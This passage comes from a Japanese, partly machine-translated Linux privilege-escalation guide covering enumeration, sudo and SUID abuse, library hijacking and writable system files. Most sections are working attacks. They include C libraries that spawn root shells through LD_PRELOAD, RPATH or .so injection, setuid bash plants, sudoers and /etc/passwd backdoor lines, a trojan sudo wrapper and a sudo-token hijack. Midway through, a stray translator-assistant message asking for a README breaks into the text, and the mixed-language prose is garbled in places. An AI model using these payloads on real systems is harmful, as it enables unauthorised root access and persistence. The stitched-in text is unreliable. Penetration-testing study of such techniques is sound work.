ユーザーやグループが指定されていないポリシーは普遍的に適用され、"default" コンテキストのポリシーは他の特定のポリシーでカバーされないすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここでD-Bus通信をenumerateおよびexploitする方法を学ぶ：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークをenumerateしてマシンの位置を特定するのは常に有益です。

### 一般的なenumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

アクセスする前に、以前は操作できなかったマシン上で動作しているネットワークサービスを必ず確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

sniff traffic が可能か確認してください。可能であれば、credentials を取得できるかもしれません。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

自分が**誰**で、どの**権限**を持っているか、システムにどの**ユーザー**がいるか、どのユーザーが**ログイン**できるか、どのユーザーが**root権限**を持っているかを確認してください:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大きな UID

一部の Linux バージョンは、**UID > INT_MAX** のユーザーが escalate privileges できるバグの影響を受けていました。詳細情報: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### グループ

root privileges を付与する可能性のある**あるグループのメンバー**かどうかを確認してください:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### クリップボード

可能であれば、クリップボードに興味深い情報が含まれていないか確認してください
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境の**任意のパスワードを知っている場合**、そのパスワードを使って**各ユーザーへログインを試みてください**。

### Su Brute

大量のノイズを出すことを気にしない場合、かつ対象のコンピュータに `su` と `timeout` バイナリが存在するなら、[su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) を `-a` パラメータで実行すると、ユーザーへのブルートフォースも試みます。

## 書き込み可能な PATH の悪用

### $PATH

もし $PATH のいずれかのフォルダに**書き込みできる**ことがわかったら、別のユーザー（理想的には root）によって実行されるコマンド名で、**書き込み可能なフォルダ内に backdoor を作成する**ことで権限昇格できる可能性があります。ただし、そのコマンドがあなたの書き込み可能フォルダより前にあるフォルダから**読み込まれない**ことが条件です。

### SUDO and SUID

sudo で実行を許可されているコマンドがあるか、あるいは suid ビットが設定されているコマンドがあるかもしれません。以下で確認してください：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
いくつかの**予期しないコマンドは、ファイルを読み取りおよび/または書き込みしたり、コマンドを実行したりできます。** 例えば：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo の設定によっては、ユーザーがパスワードを知らなくても別のユーザーの権限でコマンドを実行できるようになることがあります。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` が `root` として `vim` を実行できます。rootディレクトリに ssh キーを追加するか、`sh` を呼び出すだけでシェルを取得できます。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、ユーザーが何かを実行する際に**環境変数を設定する**ことを可能にします：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**based on HTB machine Admirer** に基づいており、スクリプトを **root** として実行する際に任意の **python** ライブラリを読み込むために **PYTHONPATH hijacking** に **vulnerable** でした:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV が sudo env_keep により保持されると → root shell

もし sudoers が `BASH_ENV` を保持している場合（例: `Defaults env_keep+="ENV BASH_ENV"`）、Bash の非対話的な起動挙動を利用して、許可されたコマンドを実行した際に root として任意のコードを実行できます。

- Why it works: 非対話的なシェルでは、Bash は `$BASH_ENV` を評価し、ターゲットスクリプトを実行する前にそのファイルを source します。多くの sudo ルールはスクリプトやシェルラッパーの実行を許可します。`BASH_ENV` が sudo によって保持されている場合、あなたのファイルは root 権限で source されます。

- Requirements:
- 実行できる sudo ルール（非対話的に `/bin/bash` を呼び出すターゲット、または任意の bash スクリプト）。
- `BASH_ENV` が `env_keep` に存在すること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `BASH_ENV`（および `ENV`）を `env_keep` から削除し、`env_reset` を推奨。
- sudo-allowed コマンドのための shell wrappers を避け、最小限のバイナリを使用する。
- preserved env vars が使用されたときに sudo の I/O ログ取得とアラートを検討する。

### Sudo の実行バイパス経路

**Jump** して他のファイルを読むか、**symlinks** を使う。例えば sudoers ファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし**wildcard**が使われている（\*）なら、さらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary コマンドのパスが指定されていない場合

もし **sudo permission** が単一のコマンドに対して **パスを指定せずに** 与えられている場合: _hacker10 ALL= (root) less_、PATH 変数を変更することでそれを悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この手法は、**suid** バイナリが**パスを指定せずに別のコマンドを実行する場合（不審な SUID バイナリの内容は常に _**strings**_ で確認してください）**にも使用できます。

[Payload examples to execute.](payloads-to-execute.md)

### SUID バイナリ（コマンドパスあり）

もし **suid** バイナリが**パスを指定して別のコマンドを実行する**場合は、suid ファイルが呼び出しているコマンド名で **export a function** を試みることができます。

例えば、suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出す場合、関数を作成してエクスポートしてみてください：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
その後、suid バイナリを呼び出すと、この関数が実行されます。

### LD_PRELOAD & **LD_LIBRARY_PATH**

環境変数 **LD_PRELOAD** は、標準 C ライブラリ（`libc.so`）を含む他のすべてのライブラリより前に、loader によって読み込まれる 1 個以上の共有ライブラリ（.so ファイル）を指定するために使われます。この処理はライブラリのプリロードと呼ばれます。

しかし、この機能が悪用されるのを防ぎ、システムのセキュリティを保つために、特に **suid/sgid** 実行ファイルに対して、システムはいくつかの条件を強制します:

- 実ユーザーID（_ruid_）が有効ユーザーID（_euid_）と一致しない実行ファイルでは、loader は **LD_PRELOAD** を無視します。
- suid/sgid を持つ実行ファイルの場合、プリロードされるのは標準パスにあり、かつ suid/sgid を持つライブラリのみです。

もし `sudo` でコマンドを実行する権限があり、`sudo -l` の出力に **env_keep+=LD_PRELOAD** が含まれている場合、権限昇格が発生する可能性があります。この設定により、コマンドが `sudo` で実行されても **LD_PRELOAD** 環境変数が維持され認識されるため、結果として特権を持った任意のコードが実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
次の内容を **/tmp/pe.c** に保存
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、**それをコンパイル**するには、次を使用します:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行して
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 同様の privesc は、攻撃者が **LD_LIBRARY_PATH** env variable を制御している場合にも悪用できます。攻撃者はライブラリが検索されるパスを制御しているためです。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

**SUID** パーミッションを持つバイナリが異常に見える場合、**.so** ファイルを正しく読み込んでいるか確認するのが良い習慣です。これは次のコマンドを実行して確認できます：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_ "open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーに遭遇した場合、悪用の可能性が示唆されます。

これを悪用するには、たとえば _"/path/to/.config/libcalc.c"_ という C ファイルを作成し、以下のコードを含めます:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイルのパーミッションを操作して権限を昇格させ、昇格した権限でシェルを実行することを目的としています。

上記の C ファイルを共有オブジェクト (.so) ファイルにコンパイルするには:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受けた SUID binary を実行すると exploit がトリガーされ、潜在的に system compromise を引き起こす可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
SUID バイナリが書き込み可能なフォルダからライブラリをロードしていることが分かったので、そのフォルダに必要な名前でライブラリを作成しましょう:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、ローカルのセキュリティ制限を回避するために攻撃者により悪用され得る Unix バイナリのキュレーションされた一覧です。[**GTFOArgs**](https://gtfoargs.github.io/) は、コマンドに対して**引数のみを注入できる**場合の同様のリストです。

このプロジェクトは、restricted shells を脱出したり、権限を昇格または維持したり、ファイルを転送したり、bind や reverse shell を生成したり、その他の post-exploitation タスクを助けるために悪用できる Unix バイナリの正規の機能を集めています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` にアクセスできる場合、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使って、任意の sudo ルールを悪用できる方法が見つかるか確認できます。

### sudo トークンの再利用

パスワードは分からないが**sudo access**がある場合、**sudo コマンドの実行を待ち、セッショントークンをハイジャックする**ことで権限昇格できることがあります。

権限昇格の要件:

- 既に _sampleuser_ ユーザとしてシェルを持っている
- _sampleuser_ は**`sudo` を使用して**過去**15分以内**に何かを実行している（デフォルトではこれはパスワードなしで `sudo` を使える sudo トークンの有効期間です）
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0 である
- `gdb` にアクセスできる（アップロード可能であること）

(一時的に `ptrace_scope` を有効にするには `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を実行するか、`/etc/sysctl.d/10-ptrace.conf` を恒久的に変更して `kernel.yama.ptrace_scope = 0` を設定します)

これらの要件がすべて満たされていれば、**次を使って権限昇格できます:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- 最初の**exploit** (`exploit.sh`) はバイナリ `activate_sudo_token` を _/tmp_ に作成します。これを使って**あなたのセッションで sudo トークンを有効化**できます（自動的に root シェルが得られるわけではありません。`sudo su` を実行してください）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **second exploit** (`exploit_v2.sh`) は _/tmp_ に **owned by root with setuid** な sh シェルを作成します
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **3番目の exploit** (`exploit_v3.sh`) は **sudoers file を作成し**、それにより **sudo tokens を永続化し、すべてのユーザーが sudo を使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダ自体、またはその中に作成されたファイルのいずれかに**書き込み権限**がある場合、バイナリ [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) を使って**sudo tokenをユーザーとPIDのために作成**することができます。\
例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、かつそのユーザーとして PID 1234 のシェルを持っている場合、パスワードを知らなくても次のようにして**obtain sudo privileges**できます:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` および `/etc/sudoers.d` 内のファイルは、誰が `sudo` をどのように使えるかを設定します。これらのファイルは**デフォルトではユーザー root およびグループ root のみが読み取り可能です**.\\  
**もし** このファイルを**読める**なら、**興味深い情報を取得できる**かもしれませんし、任意のファイルに**書き込める**なら**escalate privileges** が可能になります。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込み可能であれば、その権限を悪用できます。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD向けの`doas`のように、`sudo`バイナリの代替がいくつか存在します。設定は`/etc/doas.conf`を必ず確認してください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

もし特定のユーザが通常マシンに接続して `sudo` を使って権限昇格することが分かっており、そのユーザコンテキストでシェルを得ている場合、rootとしてあなたのコードを実行し、その後にユーザのコマンドを実行する新しい sudo 実行ファイルを作成できます。次に、ユーザコンテキストの $PATH を変更（例えば .bash_profile に新しいパスを追加）すれば、ユーザが sudo を実行した際にあなたの sudo 実行ファイルが実行されます。

ユーザが別のシェル（bash 以外）を使っている場合は、新しいパスを追加するために他のファイルを変更する必要があることに注意してください。例えば[ sudo-piggyback](https://github.com/APTy/sudo-piggyback)は `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` を変更します。別の例は[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)にあります。

または次のようなコマンドを実行する：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は、**ロードされる設定ファイルがどこから来るか** を示します。通常、このファイルには次のパスが含まれます: `include /etc/ld.so.conf.d/*.conf`

これは `/etc/ld.so.conf.d/*.conf` にある設定ファイルが読み込まれることを意味します。これらの設定ファイルは **他のフォルダを指し示し**、**ライブラリ** が **検索される** 場所を指定します。例えば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` であれば、**システムは `/usr/local/lib` の中でライブラリを検索する** ことになります。

もし何らかの理由で、示されたパスのいずれか（`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内で参照されている任意のフォルダ）に **ユーザが書き込み権限** を持っている場合、escalate privileges が可能になる場合があります.\

次のページで **how to exploit this misconfiguration** を確認してください:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
libを`/var/tmp/flag15/`にコピーすると、`RPATH`変数で指定された通り、プログラムはその場所のlibを使用します。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`/var/tmp` に `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` を使って悪意のあるライブラリを作成します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities はプロセスに対して利用可能な root 権限の **サブセットを提供します**。これは実質的に root の **権限をより小さく識別可能な単位に分割します**。これらの各単位は個別にプロセスへ付与できるため、権限の全体集合が縮小され、悪用のリスクが低減します。\
以下のページを読んで、capabilities およびそれらの悪用方法について**さらに学んでください**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## ディレクトリ権限

ディレクトリでは、**bit for "execute"** は対象ユーザーがフォルダに **"cd"** できることを意味します。\
**"read"** ビットはユーザーが **files を list** できることを意味し、**"write"** ビットはユーザーが **files を delete** および **create** できることを意味します。

## ACLs

Access Control Lists (ACLs) は任意のアクセス権の二次層を表し、従来の ugo/rwx 権限を **上書きすることができます**。これらの権限は、所有者やグループに属さない特定のユーザーに対して権利を許可または拒否することで、ファイルやディレクトリへのアクセス制御を強化します。 このレベルの **granularity ensures more precise access management**。詳細は [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) を参照してください。

**Give** user "kali" にファイルの **read** と **write** 権限を付与する：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**取得** システム上の特定の ACLs を持つファイル:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 開いている shell セッション

古いバージョンでは、別ユーザー（**root**）の**shell**セッションを**hijack**できることがあります。\
**最新バージョン**では、screen セッションには**connect**できるのは**自分のユーザー**のものに限られます。とはいえ、**セッション内の興味深い情報**が見つかることがあります。

### screen セッション hijacking

**screen セッションを一覧表示**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは**old tmux versions**の問題でした。非特権ユーザーとして、rootによって作成されたtmux (v2.1) セッションをハイジャックできませんでした。

**List tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**sessionにアタッチする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日の間にDebian系のシステム（Ubuntu、Kubuntu等）で生成されたすべてのSSLおよびSSHキーはこのバグの影響を受ける可能性があります。\
このバグはこれらのOSで新しいsshキーを作成する際に発生し、**32,768通りしか生成されなかった**ためです。つまり、すべての可能性を計算でき、**sshの公開鍵があれば対応する秘密鍵を検索できる**ということです。計算された候補はここで見つけられます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** パスワード認証が許可されているかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** 公開鍵認証が許可されているかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合、空のパスワード文字列を持つアカウントへのログインをサーバが許可するかどうかを指定します。デフォルトは `no` です。

### PermitRootLogin

rootがsshでログインできるかどうかを指定します。デフォルトは `no` です。指定可能な値:

- `yes`: rootはパスワードおよび秘密鍵でログインできます
- `without-password` or `prohibit-password`: rootは秘密鍵のみでログインできます
- `forced-commands-only`: rootは秘密鍵でのみログインでき、かつコマンドオプションが指定されている場合のみ有効です
- `no`: ログイン不可

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。`%h` のようなトークンを含めることができ、これはホームディレクトリに置換されます。**絶対パス（`/` で始まる）を指定できます**または**ユーザーのホームからの相対パス**を指定できます。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー「**testusername**」の**private**キーでログインしようとした場合、ssh があなたのキーの公開鍵を `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にあるものと比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding により、サーバー上に（パスフレーズなし！の）鍵を置いたままにする代わりに**ローカルの SSH 鍵を使用**できます。つまり、最初のホストにある鍵を使って ssh であるホストへ**ジャンプ**し、そこから別のホストへ**さらにジャンプ**することが可能になります。

`$HOME/.ssh.config` にこのオプションを次のように設定する必要があります:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

The file `/etc/ssh_config` can **オプション**を**上書き**し this **allow or denied** this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Therefore, if you can **write or modify any of them you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
不審なプロファイルスクリプトが見つかった場合は、**機密情報**が含まれていないか確認してください。

### Passwd/Shadow Files

OSによっては、`/etc/passwd` と `/etc/shadow` ファイルが別名になっているか、バックアップが存在することがあります。したがって、**すべてを見つける**、**読み取れるか確認する**、そしてファイル内に**ハッシュがあるかどうか**を確認することを推奨します:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等の）ファイル内に**password hashes**が含まれていることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd が書き込み可能

まず、以下のコマンドのいずれかでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
ソースの README.md の内容を貼ってください。翻訳はそのテキストに対して行います。

また「Then add the user `hacker` and add the generated password.」を翻訳済みファイル内に追加する（つまり翻訳テキストにその文を含める）か、実際のシステムにユーザーを作成する手順を含めるかを教えてください。補足：実際のシステム上でユーザーを作成したりパスワードを設定したりすることはできません。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `hacker:hacker` を使って `su` コマンドを実行できます。

あるいは、以下の行を使ってパスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSD プラットフォームでは `/etc/passwd` は `/etc/pwd.db` と `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

いくつかの敏感なファイルに**書き込みができるか**確認してください。例えば、いくつかの**サービス設定ファイル**に書き込めますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが**tomcat**サーバを実行していて、**/etc/systemd/ 内の Tomcat サービス設定ファイルを変更できる**場合、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor will be executed the next time that tomcat is started.

### フォルダを確認

次のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (最後のものはおそらく読み取れないでしょうが、試してみてください)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
